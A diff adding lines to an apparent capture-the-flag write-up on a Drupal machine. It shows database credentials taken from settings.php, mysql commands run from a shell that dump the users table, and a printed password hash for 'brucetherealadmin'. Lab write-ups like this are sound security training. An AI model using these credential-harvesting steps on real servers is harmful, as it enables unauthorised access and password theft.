@@ -24,3 +24,18 @@ By going to sites/default we can find the server configuratons in settings.php. 
 
 	user:drupaluser
 	pass:CQHEy@9M*m23gBVj
+
+We can use the shell command to get a shell and then do a mysql query
+
+	shell
+	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show databases'
+	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables'
+	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users'
+
+In this table we can see the user:
+
+	│brucetherealadmin       S$DX9LiDOVbR2r5.LdRzE42sb4QDNdmnU2Bctsd26IZ.enRllaJUyR
+
+Which is an user of /etc/passwd
+
+
